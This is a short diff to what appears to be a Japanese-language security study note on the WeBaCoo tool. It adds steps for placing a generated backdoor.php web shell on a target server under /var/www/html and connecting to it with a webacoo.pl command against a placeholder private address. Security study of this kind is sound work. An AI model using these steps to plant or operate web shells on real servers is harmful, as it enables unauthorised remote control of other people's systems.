@@ -154,7 +154,7 @@ mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 <br>
 #Webacoo
 
-　ハッキングツール
+　ハッキングツール？ 攻撃者の手を知ることは重要。
 
 ##backdoor を作成する
 
@@ -171,3 +171,12 @@ $ ls
 backdoor.php
 ```
 
+##backdoor.php を仕掛ける
+
+　対象のサーバーに backdoor.php を配置する。たとえば ```/var/www/html/backdoor.php``` のように配置。
+
+##Cracking
+
+```
+$ webacoo.pl -t -u http://192.168.yyy.zzz/backdoor.php
+```
